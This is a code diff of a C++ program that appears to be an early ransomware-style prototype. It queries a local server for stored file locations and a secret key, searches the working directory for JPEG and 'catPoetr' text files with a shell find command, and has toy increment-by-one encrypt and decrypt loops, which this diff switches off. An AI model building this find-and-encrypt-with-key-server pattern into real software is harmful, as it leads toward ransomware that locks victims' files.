@@ -9,43 +9,19 @@
 
 int main(){  
 	std::vector<std::string> fileLocationsVector;
-	//std::vector<std::vector<std::string>> fileContentVector;
 	nlohmann::json j_complete = nlohmann::json::parse(get_request("http://127.0.0.1:5000/locations"));
 	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");	
-    std::vector<std::string> locationsToBeEncrypted;
-    int count = 0; // TODO - change to bool?
-    bool decrypt = false;
+    std::vector<std::string> locationsToBeEncrypted;  
 
-    // TODO - recursively map directories and find in not just local directories and sub directories.
-	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.    
-
-	// Reads the locations from the local fileLocation file into a string vector. Then reads contents into its own vector of string vectors.
-	bool success = getFileContents("fileLocations", fileLocationsVector);
-	
-	// Puts server locations into a string vector.	
-	std::vector<std::string> serverLocationsVector = jsonToStringVector(j_complete);	
-	
-	// Compares fileLocationsVector with serverStoredLocationsRaw and removes already stored locations.
-	locationsMinusServerLocations(locationsToBeEncrypted, fileLocationsVector, serverLocationsVector);
-
-	
-
-
+	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document. TODO 
+	bool success = getFileContents("fileLocations", fileLocationsVector); // Reads found file locations into string vector.	
+	std::vector<std::string> serverLocationsVector = jsonToStringVector(j_complete); // Puts server locations into a string vector.		
+	locationsMinusServerLocations(locationsToBeEncrypted, fileLocationsVector, serverLocationsVector); // Removes locations already stored on server.  
     
-    
-    std::vector<std::vector<std::string>> fileContentVector2 = fileContentRetreiver(serverLocationsVector);
+	//--------------------------------------------------------------------------------------------------------------
 
-    std::vector<std::vector<std::string>> fileContentVector3 = fileContentRetreiver(fileLocationsVector);
-
-    std::vector<std::vector<std::string>> fileContentVector = fileContentRetreiver(locationsToBeEncrypted); // ?
-
-
- 
-    
-    
-	
-
-    if(locationsToBeEncrypted.size() > 0){
+    if(locationsToBeEncrypted.size() > 0 && false){
+    	std::vector<std::vector<std::string>> fileContentVector = fileContentRetreiver(locationsToBeEncrypted); // ?
 	 	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
 		for(auto& file: fileContentVector){
 			for(auto& line : file){
@@ -71,7 +47,8 @@ int main(){
 		}	
     }
 
-    if(decrypt){
+    if(false){
+    	std::vector<std::vector<std::string>> fileContentVector2 = fileContentRetreiver(serverLocationsVector);
 	    // DECRYPT - Basic encryption. Just decrements by one. Will change for asymmetric decryption.
 		for(auto& file: fileContentVector2){
 			for(auto& line : file){
